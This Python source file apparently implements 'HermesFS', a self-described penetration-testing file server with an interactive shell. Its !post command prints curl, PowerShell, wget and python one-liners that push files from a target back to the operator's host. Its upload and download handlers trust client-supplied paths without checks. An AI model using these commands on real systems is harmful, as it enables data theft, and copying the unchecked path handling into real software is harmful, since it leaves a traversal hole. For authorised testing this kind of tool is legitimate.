#!/usr/bin/env python3

import argparse
from http.server import BaseHTTPRequestHandler, HTTPServer
from colorama import Fore, Style
import signal
import psutil
import threading
import os
import urllib.request
from datetime import datetime
from urllib.parse import urlparse, unquote
import readline


class Logger:
    def __init__(self, log_file_path):
        self.log_file_path = log_file_path

    def log(self, message, severity="INFO"):
        sev_colors = {
            "INFO": Fore.BLUE,
            "ERROR": Fore.RED,
            "WARNING": Fore.YELLOW
        }
        severity_color = sev_colors.get(severity, Fore.WHITE)
        timestamp = datetime.now().strftime('%d/%m/%Y:%H:%M:%S')
        with open(self.log_file_path, 'a') as log_file:
            log_message = f"[{timestamp}] {severity_color}{severity}{Style.RESET_ALL} {message.strip()}\n"
            log_file.write(log_message)

    def read_logs(self):
        with open(self.log_file_path, 'r') as log_file:
            logs = log_file.readlines()
        return logs

class RequestHandler(BaseHTTPRequestHandler):
    def __init__(self, logger, serving_path, *args, **kwargs):
        self.logger = logger
        self.serving_path = serving_path
        super().__init__(*args, **kwargs)

    def do_GET(self):
        self._log_request("GET")
        self._handle_get_request()

    def _handle_get_request(self):
        path = unquote(self.path)
        abs_path = os.path.join(self.serving_path, path.strip('/'))
        
        if os.path.isdir(abs_path):
            self._list_directory(abs_path)
        elif os.path.isfile(abs_path):
            self._serve_file(abs_path)
        else:
            self._send_response(404, b'Not Found')

    def do_POST(self):
        self._log_request("POST")
        self._handle_post_request()

    def _handle_post_request(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        # Parsing the filename from the headers
        filename = self.headers.get('filename')
        if not filename:
            self._send_response(400, b'Bad Request: Filename is missing')
            return

        # Saving the file
        try:
            upload_file_path = os.path.join(uploads_path, filename)
            with open(upload_file_path, 'wb') as file:
                file.write(post_data)
            self._send_response(200, b'File uploaded successfully')
            self._log_request("POST", upload_path=upload_file_path)
        except Exception as e:
            self._send_response(500, f'Internal Server Error: {e}'.encode())
            self.logger.log(f"Error in file upload: {e}", severity="ERROR")

    def _serve_file(self, path):
        try:
            with open(path, 'rb') as file:
                self._send_response(200, file.read(), 'application/octet-stream')
        except FileNotFoundError:
            self._send_response(404, b'File not found')

    def _list_directory(self, path):
        try:
            items = os.listdir(path)
            content = '<html><body><ul>'
            # Get the relative path from the serving_path
            rel_path = os.path.relpath(path, self.serving_path)
            if rel_path != '.':
                # Add a link to go up one directory level
                up_link = os.path.dirname(rel_path)
                content += f'<li><a href="/{up_link}/">../</a></li>'

            for item in items:
                item_path = os.path.join(rel_path, item)
                display_name = item + '/' if os.path.isdir(os.path.join(path, item)) else item
                content += f'<li><a href="/{item_path}">{display_name}</a></li>'
            content += '</ul></body></html>'
            self._send_response(200, content.encode('utf-8'), 'text/html')
        except OSError:
            self._send_response(404, b'Not Found')

    def _send_response(self, code, content, content_type='text/html'):
        self.send_response(code)
        self.send_header('Content-type', content_type)
        self.end_headers()
        self.wfile.write(content)

    def _log_request(self, method, upload_path=None):
        log_entry = f"{method} {self.client_address[0]}:{self.client_address[1]} ({self.path})"
        if upload_path:
            log_entry += f" - {upload_path}"
        self.logger.log(log_entry)

    def log_message(self, format, *args):
        # Format the log message
        message = "%s - - [%s] %s\n" % (
            self.client_address[0],
            self.log_date_time_string(),
            format % args
        )
        # Use the logger to log the message instead of printing it
        # self.logger.log(message)
        pass

class Server:
    def __init__(self, logger, interface, port, serving_path):
        self.logger = logger
        self.ip = self.get_ip_address(interface)
        self.port = port
        self.serving_path = serving_path

    def get_ip_address(self, interface_name):
        interfaces = psutil.net_if_addrs()
        # print(interfaces[interface_name][0].address)
        return interfaces[interface_name][0].address
    def run(self):
        server_address = (self.ip, self.port)
        httpd = HTTPServer(server_address, lambda *args, **kwargs: RequestHandler(self.logger, self.serving_path, *args, **kwargs))
        httpd.serve_forever()

class InteractiveShell:
    def __init__(self, server, logger, serving_path):
        self.server = server
        self.logger = logger
        self.serving_path = serving_path
        self.commands = {
            "!ls": self.list_served_files,
            "!exit": self.exit_shell,
            "!cd": self.change_directory,
            "!help": self.show_help,
            "!post": self.show_post_command,
        }
        self.setup_auto_complete()

    def start(self):
        print("HermesFS Interactive Shell. Type !help for commands.")
        
        # Ignore the KeyboardInterrupt signal (Ctrl+C)
        # signal.signal(signal.SIGINT, signal.SIG_IGN)

        while True:
            try:
                command = input("HermesFS> ")
                if command.startswith('!'):
                    cmd_parts = command.split()
                    cmd_name = cmd_parts[0]
                    args = cmd_parts[1:]
                    self.execute_command(cmd_name, *args)
                else:
                    try:
                        os.system(command.strip())
                    except Exception as e:
                        print(f"Error executing command: {command}\n{e}")
            except EOFError:
                # Handle Ctrl+D: Exit the shell
                print("\nExiting HermesFS Interactive Shell.")
                break
            except KeyboardInterrupt:
                # Handle Ctrl+C: Do nothing
                print()
                pass



    def list_served_files(self):
        served_files = os.listdir(self.serving_path)
        files_list = "\n".join([f"  - http://{self.server.ip}:{self.server.port}/{file}" for file in served_files])
        print(f"Files served from {self.serving_path}:\n{files_list}")

    def change_directory(self, *args):
        if len(args) != 1:
            print("Usage: !cd <path>")
            return
        try:
            new_path = os.path.join(self.serving_path, args[0])
            os.chdir(new_path)
            print(f"Changed directory to {self.serving_path}")
        except Exception as e:
            print(f"Error changing directory: {e}")

    def show_help(self):
        help_text = "\n".join([f"{cmd}: {func.__doc__}" for cmd, func in self.commands.items()])
        print(f"Available commands:\n{help_text}")

    def show_post_command(self, *args):
        # Args is just the filename to upload
        print(f'To POST a file to the server use one of the following commands:')
        filename = args[0] if args else "your_file.txt"
        # We need header filename: <filename>
        #curl
        post_command = f'curl -X POST --data-binary @{filename} -H "filename: {filename}" http://{self.server.ip}:{self.server.port}'
        print(post_command + "\n")
        # invoke-webrequest
        post_command = f"invoke-webrequest -Method POST -InFile {filename} -Headers @{{filename='{filename}'}} http://{self.server.ip}:{self.server.port}"
        print(post_command + "\n")
        # wget
        post_command = f"wget --post-file={filename} --header='filename: {filename}' http://{self.server.ip}:{self.server.port}"
        print(post_command)
        # python
        post_command = f"python -c \"import requests; requests.post('http://{self.server.ip}:{self.server.port}', files={{'file': open('{filename}', 'rb')}}, headers={{'filename': '{filename}'}})\""
        print(post_command + "\n")

    def exit_shell(self):
        print("Exiting HermesFS Interactive Shell.")
        exit(0)

    def execute_command(self, command, *args):
        func = self.commands.get(command)
        if func:
            func(*args)
        else:
            print(f"Unknown command: {command}")

    def setup_auto_complete(self):    
        # Define the list of autocomplete options
        commands = list(self.commands.keys()) + ["exit", "help"]  # add any additional commands
        # Define the completer function
        def completer(text, state):
            options = [command for command in commands if command.startswith(text)]
            if state < len(options):
                return options[state]
            else:
                return None
        # Set the completer function
        readline.set_completer(completer)
        readline.parse_and_bind("tab: complete")
        

# Initialize argparse
parser = argparse.ArgumentParser(description="HermesFS - A File Server for Penetration Testing")
parser.add_argument("-p", "--port", type=int, default=8000, help="Port to run the server on")
parser.add_argument("-i", "--interface", default="tun0", help="Network interface to use")
args = parser.parse_args()

# Get path to the script
script_path = os.path.realpath(__file__)
# Remove the script name from the path
file_path = os.path.dirname(script_path) + "/files"
uploads_path = os.path.dirname(script_path) + "/uploads"
logs_path = os.path.dirname(script_path) + "/logs"

# Initialize logger
current_time = datetime.now().strftime('%d%m%Y%H%M%S')
os.makedirs(logs_path, exist_ok=True)
log_file_path = os.path.join(logs_path, f"{current_time}.txt")
logger = Logger(log_file_path)

# check upload and files dir exist if not create
os.makedirs(uploads_path, exist_ok=True)
os.makedirs(file_path, exist_ok=True)

server = Server(logger, args.interface, args.port, file_path)
server_thread = threading.Thread(target=server.run)
server_thread.daemon = True
server_thread.start()

shell = InteractiveShell(server, logger, file_path)
shell.start()
